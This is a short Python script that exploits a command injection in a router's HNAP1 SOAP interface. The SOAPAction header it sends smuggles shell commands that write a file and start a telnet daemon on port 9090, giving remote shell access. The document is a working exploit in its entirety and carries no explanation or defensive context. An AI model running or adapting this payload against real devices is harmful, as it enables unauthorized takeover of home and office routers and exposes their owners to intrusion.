import socket
import struct

buf = "POST /HNAP1/ HTTP/1.0\r\nHOST: 192.168.0.1\r\nUser-Agent: test\r\nContent-Length: 1\r\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/" + ';echo "success" > mytest.php;telnetd -p 9090;test\r\n' + "1\r\n\r\n"

print "[+] sending buffer size", len(buf)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.1", 80))
s.send(buf)